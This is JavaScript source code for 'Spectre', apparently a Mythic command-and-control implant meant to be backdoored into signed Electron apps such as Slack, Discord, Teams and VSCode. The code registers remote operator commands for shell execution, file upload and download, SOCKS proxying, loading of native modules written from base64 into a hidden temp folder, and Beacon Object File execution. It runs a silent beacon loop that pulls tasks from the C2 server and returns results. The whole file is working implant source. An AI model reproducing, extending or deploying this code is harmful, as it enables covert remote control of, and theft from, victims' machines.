// ============================================================
// Spectre - Main Agent Orchestrator
//
// JavaScript-based Mythic C2 agent designed for execution within
// trusted Electron applications. Avoids shellcode injection by
// running as native Node.js code under a legitimately-signed
// process (Slack, Discord, Teams, VSCode).
//
// Architecture:
//   1. Backdoor loads inside Electron app via modified JS module
//   2. Agent initializes C2 comms (HTTP with AES-256 encryption)
//   3. Checks in with Mythic, receives callback UUID
//   4. Enters beacon loop: get_tasking -> execute -> post_response
//   5. Optional native .node addons for Windows API / COFF/BOF
// ============================================================

class SpectreAgent {
    constructor(config) {
        this.config = config;
        this.running = false;
        this.commands = {};
        this._dynamicModules = {};

        // Initialize subsystems
        FilesystemHandler.init();
        SpectreCrypto.init(config.aes_psk || null);
        SpectreHTTP.init(config);

        // Register built-in commands
        this._registerCommands();
    }

    /**
     * Register all built-in command handlers.
     */
    _registerCommands() {
        const self = this;

        this.commands = {
            'shell': function(task) {
                return ShellHandler.execute({ command: task.parameters });
            },
            'ls': function(task) {
                const params = typeof task.parameters === 'string'
                    ? { path: task.parameters }
                    : task.parameters;
                return FilesystemHandler.ls(params);
            },
            'cd': function(task) {
                const params = typeof task.parameters === 'string'
                    ? { path: task.parameters }
                    : task.parameters;
                return FilesystemHandler.cd(params);
            },
            'pwd': function() {
                return FilesystemHandler.pwd();
            },
            'whoami': function() {
                return ProcessHandler.whoami();
            },
            'ps': function() {
                return ProcessHandler.ps();
            },
            'upload': function(task) {
                const params = typeof task.parameters === 'string'
                    ? JSON.parse(task.parameters)
                    : task.parameters;
                params.task_id = task.id;
                return TransferHandler.upload(params);
            },
            'download': function(task) {
                const params = typeof task.parameters === 'string'
                    ? JSON.parse(task.parameters)
                    : task.parameters;
                params.task_id = task.id;
                return TransferHandler.download(params);
            },
            'cp': function(task) {
                return FilesystemHandler.cp(
                    typeof task.parameters === 'string'
                        ? JSON.parse(task.parameters)
                        : task.parameters
                );
            },
            'mv': function(task) {
                return FilesystemHandler.mv(
                    typeof task.parameters === 'string'
                        ? JSON.parse(task.parameters)
                        : task.parameters
                );
            },
            'rm': function(task) {
                return FilesystemHandler.rm(
                    typeof task.parameters === 'string'
                        ? { path: task.parameters }
                        : task.parameters
                );
            },
            'mkdir': function(task) {
                return FilesystemHandler.mkdir(
                    typeof task.parameters === 'string'
                        ? { path: task.parameters }
                        : task.parameters
                );
            },
            'cat': function(task) {
                return FilesystemHandler.cat(
                    typeof task.parameters === 'string'
                        ? { path: task.parameters }
                        : task.parameters
                );
            },
            'sleep': function(task) {
                const params = typeof task.parameters === 'string'
                    ? JSON.parse(task.parameters)
                    : task.parameters;
                SpectreHTTP.updateInterval(params.interval, params.jitter);
                return {
                    user_output: 'Sleep updated: ' + (params.interval || '?') + 's, ' + (params.jitter || '?') + '% jitter',
                    completed: true,
                    status: 'success',
                };
            },
            'exit': function() {
                self.running = false;
                return {
                    user_output: 'Agent exiting...',
                    completed: true,
                    status: 'success',
                };
            },
            'socks': function(task) {
                const params = typeof task.parameters === 'string'
                    ? JSON.parse(task.parameters)
                    : task.parameters;
                if (params.action === 'start') {
                    return SocksHandler.start(params);
                } else {
                    return SocksHandler.stop();
                }
            },
            'load': function(task) {
                return self._loadModule(task);
            },
            'bof': function(task) {
                return self._executeBOF(task);
            },
        };
    }

    /**
     * Dynamically load a native Node addon (.node file) or JS module.
     * This is how operators extend the agent with COFF loaders, etc.
     */
    _loadModule(task) {
        const fs = require('fs');
        const path = require('path');
        const os = require('os');

        try {
            const params = typeof task.parameters === 'string'
                ? JSON.parse(task.parameters)
                : task.parameters;

            const moduleName = params.name;
            const moduleData = Buffer.from(params.data, 'base64');
            const moduleType = params.type || 'node'; // 'node' or 'js'

            // Write module to temp directory
            const tempDir = path.join(os.tmpdir(), '.spectre_modules');
            if (!fs.existsSync(tempDir)) {
                fs.mkdirSync(tempDir, { recursive: true });
            }

            const ext = moduleType === 'node' ? '.node' : '.js';
            const modulePath = path.join(tempDir, moduleName + ext);
            fs.writeFileSync(modulePath, moduleData);

            // Load the module
            const loaded = require(modulePath);
            this._dynamicModules[moduleName] = loaded;

            return {
                user_output: 'Module loaded: ' + moduleName + ' (' + moduleType + ')',
                completed: true,
                status: 'success',
            };
        } catch (err) {
            return {
                user_output: 'Failed to load module: ' + err.message,
                completed: true,
                status: 'error',
            };
        }
    }

    /**
     * Execute a BOF (Beacon Object File) via the COFF loader addon.
     * Requires the 'coff_loader' native module to be loaded first.
     */
    _executeBOF(task) {
        try {
            const coffLoader = this._dynamicModules['coff_loader'];
            if (!coffLoader) {
                return {
                    user_output: 'COFF loader not loaded. Use "load" to load the coff_loader.node addon first.',
                    completed: true,
                    status: 'error',
                };
            }

            const params = typeof task.parameters === 'string'
                ? JSON.parse(task.parameters)
                : task.parameters;

            const functionName = params.function_name || 'go';
            const bofData = Buffer.from(params.bof_data, 'base64');
            const argData = params.arguments
                ? Buffer.from(params.arguments, 'base64')
                : Buffer.alloc(0);
            const argSize = argData.length;
            const timeout = params.timeout || 30000;

            const result = coffLoader.runCOFF(
                functionName,
                bofData,
                argData,
                argSize,
                timeout
            );

            return {
                user_output: result || '(no output)',
                completed: true,
                status: 'success',
            };
        } catch (err) {
            return {
                user_output: 'BOF execution failed: ' + err.message,
                completed: true,
                status: 'error',
            };
        }
    }

    /**
     * Start the agent: key exchange -> checkin -> beacon loop.
     */
    async start() {
        this.running = true;

        try {
            // Step 1: Encrypted key exchange (if enabled)
            if (this.config.encrypted_exchange_check) {
                let retries = 0;
                while (retries < 5) {
                    try {
                        await SpectreHTTP.performKeyExchange();
                        break;
                    } catch (err) {
                        retries++;
                        await this._sleep(SpectreHTTP._getSleepTime());
                    }
                }
            }

            // Step 2: Initial checkin
            const systemInfo = ProcessHandler.getSystemInfo();
            let checkedIn = false;
            let retries = 0;

            while (!checkedIn && retries < 10) {
                try {
                    await SpectreHTTP.checkin(systemInfo);
                    checkedIn = true;
                } catch (err) {
                    retries++;
                    await this._sleep(SpectreHTTP._getSleepTime());
                }
            }

            if (!checkedIn) {
                return; // Give up after max retries
            }

            // Step 3: Main beacon loop
            await this._beaconLoop();

        } catch (err) {
            // Silent failure - don't crash the host Electron app
        }
    }

    /**
     * Main beacon loop: get tasks, execute, return results.
     */
    async _beaconLoop() {
        while (this.running) {
            try {
                // Get tasks from Mythic
                const tasks = await SpectreHTTP.getTasking();

                if (tasks && tasks.length > 0) {
                    // Process each task
                    const responses = [];

                    for (let i = 0; i < tasks.length; i++) {
                        const task = tasks[i];
                        const result = await this._executeTask(task);

                        responses.push({
                            task_id: task.id,
                            user_output: result.user_output || '',
                            completed: result.completed !== false,
                            status: result.status || 'success',
                            file_browser: result.file_browser || undefined,
                            processes: result.processes || undefined,
                            file_id: result.file_id || undefined,
                        });
                    }

                    // Send results back
                    if (responses.length > 0) {
                        await SpectreHTTP.postResponse(responses);
                    }
                }
            } catch (err) {
                // Connection error - continue beaconing
            }

            // Sleep with jitter
            await this._sleep(SpectreHTTP._getSleepTime());
        }
    }

    /**
     * Execute a single task by dispatching to the appropriate handler.
     */
    async _executeTask(task) {
        const command = task.command;
        const handler = this.commands[command];

        if (!handler) {
            // Check dynamically loaded modules
            if (this._dynamicModules[command]) {
                try {
                    const mod = this._dynamicModules[command];
                    if (typeof mod.execute === 'function') {
                        return await mod.execute(task);
                    }
                } catch (err) {
                    return {
                        user_output: 'Module execution error: ' + err.message,
                        completed: true,
                        status: 'error',
                    };
                }
            }

            return {
                user_output: 'Unknown command: ' + command,
                completed: true,
                status: 'error',
            };
        }

        try {
            const result = handler(task);
            // Handle both sync and async command handlers
            if (result && typeof result.then === 'function') {
                return await result;
            }
            return result;
        } catch (err) {
            return {
                user_output: 'Command error: ' + err.message,
                completed: true,
                status: 'error',
            };
        }
    }

    /**
     * Promise-based sleep.
     */
    _sleep(ms) {
        return new Promise(function(resolve) {
            setTimeout(resolve, ms);
        });
    }
}
